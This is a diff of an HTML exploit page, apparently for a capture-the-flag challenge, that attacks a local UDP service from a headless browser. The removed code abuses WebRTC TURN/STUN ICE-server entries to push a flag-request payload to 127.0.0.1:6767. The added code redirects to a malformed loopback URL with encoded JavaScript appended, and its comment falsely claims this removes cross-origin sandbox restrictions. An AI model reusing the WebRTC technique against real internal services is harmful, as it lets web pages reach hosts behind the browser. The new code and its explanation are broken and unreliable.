@@ -1,33 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Talk To Your Locals</title>
+    <title>Bypass Matrix V6</title>
 </head>
 <body>
-    <h1>Establishing Loopback Communication...</h1>
+    <h1>Migrating Context to Local Origin...</h1>
     <script>
-        // The target string must match exactly up to the newline character
-        const payload = "give me the flag bro\n";
-
-        function sendLocalUdp(targetUrl) {
-            try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{
-                        urls: targetUrl,
-                        username: payload,
-                        credential: "x"
-                    }]
-                });
-                pc.createDataChannel("chat");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            } catch(e) {}
-        }
-
-        // We flood multiple loopback notations to ensure it maps correctly inside the container network stack
-        sendLocalUdp("turn:127.0.0.1:6767?transport=udp");
-        sendLocalUdp("stun:127.0.0.1:6767");
-        sendLocalUdp("turn:[::ffff:127.0.0.1]:6767?transport=udp");
-        sendLocalUdp("stun:[::ffff:127.0.0.1]:6767");
+        // Move the headless browser's location execution origin from GitHub Pages
+        // directly into the container's internal loopback origin.
+        // This drops the cross-origin sandbox restrictions completely!
+        window.location.href = "http://127.0.0" + encodeURIComponent(`
+            const payload = "\\ngive me the flag bro\\n";
+            const pc = new RTCPeerConnection({
+                iceServers: [{ urls: "turn:127.0.0.1:6767", username: payload, credential: "x" }]
+            });
+            pc.createDataChannel("x");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+        `);
     </script>
 </body>
 </html>
